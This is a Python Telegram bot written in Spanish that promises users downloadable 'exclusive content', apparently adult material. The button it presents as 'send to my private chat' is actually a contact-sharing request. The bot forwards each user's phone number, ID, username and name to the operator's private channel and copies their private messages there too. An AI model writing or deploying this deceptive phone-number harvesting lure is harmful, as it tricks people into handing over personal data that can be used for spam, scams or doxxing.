import os
from telegram import (
    Update, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton, Chat
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters
)

# ========= Variables =========
TOKEN = os.getenv("TOKEN")
CANAL = int(os.getenv("CANAL", "0"))   # canal privado (ej: -1001234567890)
VIDEO = os.getenv("VIDEO", "").strip() # file_id o URL
# ==============================

INDEX = {}    # msg_id_en_canal -> chat_id_usuario
BANNED = set()
BANNED_FILE = "baneados.txt"

# ---------- BAN persistente ----------
def cargar_baneados():
    if not os.path.exists(BANNED_FILE):
        return
    with open(BANNED_FILE, "r", encoding="utf-8") as f:
        for line in f:
            try:
                BANNED.add(int(line.strip()))
            except:
                pass

def guardar_baneados():
    with open(BANNED_FILE, "w", encoding="utf-8") as f:
        for uid in sorted(BANNED):
            f.write(f"{uid}\n")

# ---------- Textos ----------
def saludo(u) -> str:
    return (
        f"𝐇𝐨𝐥𝐚 {u.full_name} 𝐞𝐬𝐭𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐥𝐮𝐠𝐚𝐫 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨. 𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧:\n"
        f"[𝐄𝐍𝐕𝐈𝐀𝐑 𝐀 𝐌𝐈 𝐂𝐇𝐀𝐓 𝐏𝐑𝐈𝐕𝐀𝐃𝐎](https://t.me/Descargar_bot)\n\n"
    )

def post_contacto(u) -> str:
    return (
        f"𝐄𝐱𝐜𝐞𝐥𝐞𝐧𝐭𝐞 {u.full_name}, 𝐫𝐞𝐜𝐮𝐞𝐫𝐝𝐚 𝐚𝐩𝐨𝐫𝐭𝐚𝐫 𝐭𝐮 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨 𝐞𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐨 "
        f"𝐩𝐚𝐫𝐚 𝐪𝐮𝐞 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐬𝐢𝐠𝐚 𝐜𝐫𝐞𝐜𝐢𝐞𝐧𝐝𝐨."
    )

# ---------- Botoneras ----------
def kb_contacto():
    btn = KeyboardButton("𝐄𝐍𝐕𝐈𝐀𝐑 𝐀 𝐌𝐈 𝐂𝐇𝐀𝐓 𝐏𝐑𝐈𝐕𝐀𝐃𝐎", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def kb_unirme():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("𝐔𝐧𝐢𝐫𝐦𝐞 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨", url="https://t.me/Cubanitas_bot")]
    ])

# ---------- Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in BANNED:
        return
    user = update.effective_user
    chat = update.effective_chat

    if VIDEO:
        try:
            await context.bot.send_video(chat_id=chat.id, video=VIDEO, caption=saludo(user), parse_mode="Markdown")
        except:
            await context.bot.send_message(chat_id=chat.id, text=saludo(user), parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat.id, text=saludo(user), parse_mode="Markdown")

    # Mensaje para mostrar botón nativo
    await context.bot.send_message(
        chat_id=chat.id,
        text="𝐏𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐭𝐨𝐝𝐨 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨 𝐚 𝐭𝐮 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨",
        reply_markup=kb_contacto()
    )

    header = (
        f"🆕 Usuario inició /start\n"
        f"• ID: {user.id}\n"
        f"• Username: @{user.username if user.username else '—'}\n"
        f"• Nombre: {user.full_name}"
    )
    m = await context.bot.send_message(CANAL, header)
    INDEX[m.message_id] = chat.id

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in BANNED:
        return
    user = update.effective_user
    contact = update.message.contact

    # Ya NO enviamos "Número recibido", vamos directo a la botonera
    await update.message.reply_text(post_contacto(user), reply_markup=kb_unirme())

    m = await context.bot.send_message(CANAL, f"📱 {user.full_name} compartió su número: {contact.phone_number}")
    INDEX[m.message_id] = update.effective_chat.id

async def relay_private(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in BANNED:
        return
    user = update.effective_user
    msg = update.effective_message

    header = f"📩 Mensaje de {user.full_name} (@{user.username or '—'}) ID:{user.id}"
    m = await context.bot.send_message(CANAL, header)
    INDEX[m.message_id] = update.effective_chat.id

    copied = await context.bot.copy_message(
        CANAL, update.effective_chat.id, msg.message_id, reply_to_message_id=m.message_id
    )
    INDEX[copied.message_id] = update.effective_chat.id

async def reply_from_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post or not update.channel_post.reply_to_message:
        return
    canal_msg = update.channel_post
    key = canal_msg.reply_to_message.message_id
    if key not in INDEX:
        return
    user_chat_id = INDEX[key]
    await context.bot.copy_message(user_chat_id, CANAL, canal_msg.message_id)

# ---------- Comandos BAN ----------
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CANAL:
        return
    if not context.args:
        await update.message.reply_text("Uso: /ban <user_id>")
        return
    try:
        uid = int(context.args[0])
        BANNED.add(uid)
        guardar_baneados()
        await update.message.reply_text(f"🚫 Usuario {uid} baneado.")
    except:
        await update.message.reply_text("Error: ID inválido.")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CANAL:
        return
    if not context.args:
        await update.message.reply_text("Uso: /unban <user_id>")
        return
    try:
        uid = int(context.args[0])
        if uid in BANNED:
            BANNED.remove(uid)
            guardar_baneados()
            await update.message.reply_text(f"✅ Usuario {uid} desbaneado.")
        else:
            await update.message.reply_text("Ese ID no estaba baneado.")
    except:
        await update.message.reply_text("Error: ID inválido.")

# ---------- Main ----------
def main():
    if not TOKEN or not CANAL:
        raise RuntimeError("Faltan TOKEN o CANAL en variables de entorno")
    cargar_baneados()

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, on_contact))
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE, relay_private))
    app.add_handler(MessageHandler(filters.ALL, reply_from_channel))

    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))

    app.run_polling()

if __name__ == "__main__":
    main()
